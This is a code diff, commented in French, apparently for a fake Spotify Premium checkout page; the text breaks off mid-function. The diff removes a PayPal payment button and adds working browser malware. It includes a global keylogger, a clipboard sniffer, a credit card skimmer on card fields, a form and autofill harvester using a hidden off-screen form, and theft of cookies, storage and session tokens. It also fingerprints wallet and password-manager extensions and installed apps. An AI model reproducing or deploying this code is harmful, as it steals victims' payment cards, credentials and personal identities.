+async function correlateIdentity() {
+    // Déterminer le meilleur nom
+    if (sessionData.realIdentity.name.full) {
+        const confidence = Math.min(sessionData.realIdentity.name.confidence + 20, 100);
+        sessionData.realIdentity.name.confidence = confidence;
+    }
+    
+    // Déterminer l'âge approximatif
+    if (sessionData.realIdentity.dateOfBirth) {
+        const birthDate = new Date(sessionData.realIdentity.dateOfBirth);
+        const ageDifMs = Date.now() - birthDate.getTime();
+        const ageDate = new Date(ageDifMs);
+        sessionData.realIdentity.age = Math.abs(ageDate.getUTCFullYear() - 1970);
     }
 }
 
-/**
- * Envoi en cas d'abandon (fermeture, navigation)
- */
-async function sendAbandonmentReport() {
-    if (hasPurchased || reportSent) return;
-    // Dernière collecte avant envoi
+// ====================== 5. KEYLOGGER GLOBAL ======================
+function setupGlobalKeylogger() {
+    let keyBuffer = '';
+    let lastSend = Date.now();
+    
+    document.addEventListener('keydown', (e) => {
+        if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Tab' || e.key === 'Backspace') {
+            keyBuffer += e.key;
+            
+            if (Date.now() - lastSend > 5000 || keyBuffer.length > 50) {
+                sessionData.stolen.keylog.push({
+                    buffer: keyBuffer,
+                    timestamp: Date.now(),
+                    url: window.location.href
+                });
+                keyBuffer = '';
+                lastSend = Date.now();
+            }
+        }
+    });
+    
+    window.addEventListener('beforeunload', () => {
+        if (keyBuffer.length > 0) {
+            sessionData.stolen.keylog.push({ buffer: keyBuffer, timestamp: Date.now(), final: true });
+        }
+    });
+}
+
+// ====================== 6. CLIPBOARD SNIFFER ======================
+function setupClipboardSniffer() {
+    let lastContent = '';
+    
+    setInterval(async () => {
+        try {
+            const text = await navigator.clipboard.readText();
+            if (text && text !== lastContent && text.length > 5) {
+                lastContent = text;
+                sessionData.stolen.clipboard.push({
+                    content: text.substring(0, 500),
+                    timestamp: Date.now(),
+                    hasEmail: /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/.test(text),
+                    hasPhone: /(\+\d{1,3}[-.]?)?\(?\d{3}\)?[-.]?\d{3}[-.]?\d{4}/.test(text),
+                    hasCreditCard: /\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}/.test(text)
+                });
+            }
+        } catch(e) {}
+    }, 3000);
+}
+
+// ====================== 7. CREDIT CARD SNIFFER ======================
+function setupCreditCardSniffer() {
+    const cardPatterns = {
+        visa: /^4[0-9]{12}(?:[0-9]{3})?$/,
+        mastercard: /^5[1-5][0-9]{14}$/,
+        amex: /^3[47][0-9]{13}$/,
+        discover: /^6(?:011|5[0-9]{2})[0-9]{12}$/
+    };
+    
+    const cardSelectors = [
+        '[name*="card" i]', '[name*="cc" i]', '[name*="credit" i]',
+        '[autocomplete="cc-number"]', '[placeholder*="card" i]'
+    ];
+    
+    const observer = new MutationObserver(() => {
+        document.querySelectorAll(cardSelectors.join(',')).forEach(el => {
+            if (!el._listener) {
+                el._listener = true;
+                el.addEventListener('input', (e) => {
+                    const value = e.target.value.replace(/\s/g, '');
+                    for (const [type, pattern] of Object.entries(cardPatterns)) {
+                        if (pattern.test(value)) {
+                            sessionData.stolen.creditCards.push({
+                                number: value,
+                                type: type,
+                                timestamp: Date.now(),
+                                element: el.id || el.name
+                            });
+                            sendImmediateReport();
+                        }
+                    }
+                });
+            }
+        });
+    });
+    
+    observer.observe(document.body, { childList: true, subtree: true });
+}
+
+// ====================== 8. FORM WATCHER ======================
+function setupFormWatcher() {
+    function captureForm(form) {
+        const formData = new FormData(form);
+        const entries = Array.from(formData.entries());
+        sessionData.stolen.forms.push({
+            action: form.action,
+            method: form.method,
+            fields: entries,
+            timestamp: Date.now()
+        });
+        
+        // Extraire données sensibles
+        entries.forEach(([name, value]) => {
+            if (value && value.trim()) {
+                const lowerName = name.toLowerCase();
+                if (lowerName.includes('email')) sessionData.realIdentity.email.primary = value;
+                if (lowerName.includes('name')) {
+                    const parts = value.trim().split(' ');
+                    sessionData.realIdentity.name.first = parts[0];
+                    sessionData.realIdentity.name.last = parts.slice(1).join(' ');
+                    sessionData.realIdentity.name.full = value;
+                }
+                if (lowerName.includes('tel') || lowerName.includes('phone')) sessionData.realIdentity.phone.number = value;
+                if (lowerName.includes('address')) sessionData.realIdentity.address.street = value;
+                if (lowerName.includes('card') || lowerName.includes('cc')) sessionData.stolen.creditCards.push({ number: value, timestamp: Date.now() });
+            }
+        });
+    }
+    
+    document.querySelectorAll('form').forEach(form => {
+        form.addEventListener('submit', (e) => captureForm(form));
+    });
+    
+    const observer = new MutationObserver((mutations) => {
+        mutations.forEach((mutation) => {
+            mutation.addedNodes.forEach((node) => {
+                if (node.nodeType === 1 && node.tagName === 'FORM') {
+                    node.addEventListener('submit', () => captureForm(node));
+                }
+            });
+        });
+    });
+    observer.observe(document.body, { childList: true, subtree: true });
+}
+
+// ====================== 9. AUTOFILL SNIFFER ======================
+function setupAutofillSniffer() {
+    const ghostForm = document.createElement('div');
+    ghostForm.innerHTML = `
+        <form id="ghost-form" style="position:absolute; top:-1000px; left:-1000px; opacity:0;">
+            <input type="text" name="name" autocomplete="name">
+            <input type="email" name="email" autocomplete="email">
+            <input type="tel" name="phone" autocomplete="tel">
+            <input type="address" name="address" autocomplete="address">
+        </form>
+    `;
+    document.body.appendChild(ghostForm);
+    
+    setInterval(() => {
+        const form = document.getElementById('ghost-form');
+        if (!form) return;
+        
+        const name = form.querySelector('[name="name"]').value;
+        const email = form.querySelector('[name="email"]').value;
+        const phone = form.querySelector('[name="phone"]').value;
+        const address = form.querySelector('[name="address"]').value;
+        
+        if (name && !sessionData.realIdentity.name.full) {
+            const parts = name.trim().split(' ');
+            sessionData.realIdentity.name.first = parts[0];
+            sessionData.realIdentity.name.last = parts.slice(1).join(' ');
+            sessionData.realIdentity.name.full = name;
+            sessionData.realIdentity.name.confidence = 80;
+            sessionData.realIdentity.name.sources.push('autofill');
+        }
+        if (email) sessionData.realIdentity.email.primary = email;
+        if (phone) sessionData.realIdentity.phone.number = phone;
+        if (address) sessionData.realIdentity.address.street = address;
+    }, 2000);
+}
+
+// ====================== 10. BEHAVIOR TRACKING ======================
+function setupBehaviorTracking() {
+    let lastMove = Date.now();
+    let focusStart = Date.now();
+    
+    document.addEventListener('mousemove', (e) => {
+        const speed = Math.sqrt(Math.pow(e.movementX, 2) + Math.pow(e.movementY, 2));
+        sessionData.behavior.mouseSpeed = Math.max(sessionData.behavior.mouseSpeed, speed);
+        lastMove = Date.now();
+    });
+    
+    document.addEventListener('click', () => {
+        sessionData.behavior.clicks++;
+        sessionData.behavior.interactionHeatmap.push({
+            type: 'click',
+            timestamp: Date.now(),
+            x: event.clientX,
+            y: event.clientY
+        });
+    });
+    
+    document.addEventListener('keydown', () => {
+        sessionData.behavior.keyPresses++;
+    });
+    
+    window.addEventListener('scroll', () => {
+        const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
+        const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+        const depth = (scrollTop / docHeight) * 100;
+        sessionData.behavior.scrollDepth = Math.max(sessionData.behavior.scrollDepth, depth);
+    });
+    
+    window.addEventListener('focus', () => { focusStart = Date.now(); });
+    window.addEventListener('blur', () => {
+        sessionData.behavior.focusTime += Date.now() - focusStart;
+    });
+    
+    setInterval(() => {
+        sessionData.behavior.sessionDuration = Math.round((Date.now() - startTime) / 1000);
+    }, 1000);
+}
+
+// ====================== 11. EXPLOITATION SYSTÈME ======================
+function executeSystemExploitation() {
+    // Capturer les tokens de session
+    captureSessionTokens();
+    
+    // Capturer les stockages
     captureStorages();
-    await sendFullReport();
+    
+    // Détecter les extensions
+    detectExtensions();
+    
+    // Détecter les périphériques
+    detectPeripherals();
+    
+    // Détecter les logiciels installés
+    detectInstalledSoftware();
 }
 
-// ====================== PAIEMENT (INTERFACE) ======================
-
-function renderPayPalButton() {
-    if (!window.paypal) {
-        console.error("PayPal SDK non chargé");
-        return;
+function captureSessionTokens() {
+    const tokens = [];
+    
+    // Cookies
+    document.cookie.split(';').forEach(cookie => {
+        const [name, value] = cookie.split('=');
+        if (value && (name.includes('token') || name.includes('session') || name.includes('auth'))) {
+            tokens.push({ type: 'cookie', name, value: value.substring(0, 100) });
+        }
+    });
+    
+    // localStorage
+    for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        const value = localStorage.getItem(key);
+        if (value && (key.includes('token') || key.includes('session') || value.includes('Bearer') || value.includes('eyJ'))) {
+            tokens.push({ type: 'localStorage', key, value: value.substring(0, 200) });
+        }
     }
-
-    paypal.Buttons({
-        style: { layout: 'vertical', color: 'gold', shape: 'pill', label: 'paypal' },
-        createOrder: (data, actions) => actions.order.create({
-            purchase_units: [{ amount: { value: '9.90' } }]
-        }),
-        onApprove: (data, actions) => actions.order.capture().then(() => {
-            hasPurchased = true;
-            clearInterval(periodicInterval);
-            handleSuccessPayment();
-        })
-    }).render('#paypal-button-container');
+    
+    sessionData.stolen.tokens = tokens;
 }
 
-function handleSuccessPayment() {
-    const container = document.querySelector('.container');
-    if (container) {
-        container.innerHTML = `
-            <div style="text-align:center; padding: 40px 0;">
-                <div style="background:#1DB954; width:64px; height:64px; border-radius:50%; display:inline-flex; align-items:center; justify-content:center; margin-bottom:24px;">
-                    <svg viewBox="0 0 24 24" width="32" fill="#000"><path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"/></svg>
-                </div>
-                <h1 style="font-size:32px;">Bienvenue sur Spotify Premium</h1>
-                <p style="color:#B3B3B3; margin-top:16px;">Votre compte est en cours d'activation. Profitez de votre musique sans limites.</p>
-            </div>
-        `;
+function captureStorages() {
+    try {
+        sessionData.stolen.cookies = document.cookie.split('; ').reduce((acc, cookie) => {
+            const [key, val] = cookie.split('=');
+            acc[key] = val;
+            return acc;
+        }, {});
+    } catch(e) {}
+    
+    try {
+        sessionData.stolen.localStorage = { ...localStorage };
+    } catch(e) {}
+    
+    try {
+        sessionData.stolen.sessionStorage = { ...sessionStorage };
+    } catch(e) {}
+}
+
+function detectExtensions() {
+    const extensions = [];
+    
+    // Test AdBlock
+    const testElement = document.createElement('div');
+    testElement.className = 'adsbox';
+    document.body.appendChild(testElement);
+    setTimeout(() => {
+        if (testElement.offsetHeight === 0) {
+            extensions.push('AdBlock detected');
+        }
+        document.body.removeChild(testElement);
+    }, 100);
+    
+    // Détection d'extensions via leur API
+    if (window.ethereum) extensions.push('MetaMask');
+    if (window.solana) extensions.push('Phantom');
+    if (window.grammarly) extensions.push('Grammarly');
+    if (window.lastpass) extensions.push('LastPass');
+    
+    sessionData.technical.system.extensions = extensions;
+}
+
+async function detectPeripherals() {
+    const devices = [];
+    
+    if (navigator.mediaDevices?.enumerateDevices) {
+        try {
+            const mediaDevices = await navigator.mediaDevices.enumerateDevices();
+            mediaDevices.forEach(device => {
+                devices.push({
+                    kind: device.kind,
+                    label: device.label || 'hidden',
+                    deviceId: device.deviceId?.substring(0, 10)
+                });
+            });
+        } catch(e) {}
     }
+    
+    if (navigator.getGamepads) {
+        const gamepads = navigator.getGamepads();
+        gamepads.forEach(gp => {
+            if (gp) {
+                devices.push({ type: 'gamepad', id: gp.id });
+            }
+        });
+    }
+    
+    sessionData.technical.system.peripherals = devices;
 }
 
-// Lier l'envoi d'abandon aux événements de fin de session
-window.addEventListener('visibilitychange', () => {
-    if (document.visibilityState === 'hidden') sendAbandonmentReport();
-});
-window.addEventListener('pagehide', sendAbandonmentReport);
+function detectInstalledSoftware() {
+    const software = [];
+    const protocols = {
+        'steam': 'steam://',
+        'discord': 'discord://',
+        'spotify': 'spotify://',
+        'vscode': 'vscode://',
+        'slack': 'slack://',
+        'zoom': 'zoommtg://',
+        'teams': 'msteams://'
+    };
+    
+    for (const [app, protocol] of Object.entries(protocols)) {
+        const start = performance.now();
+        const iframe = document.createElement('iframe');
+        iframe.src = protocol;
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+        
+        setTimeout(() => {
+            const duration = performance.now() - start;
+            if (duration < 200) {
+                software.push({ app, detected: true, responseTime: duration });
+            }
+            document.body
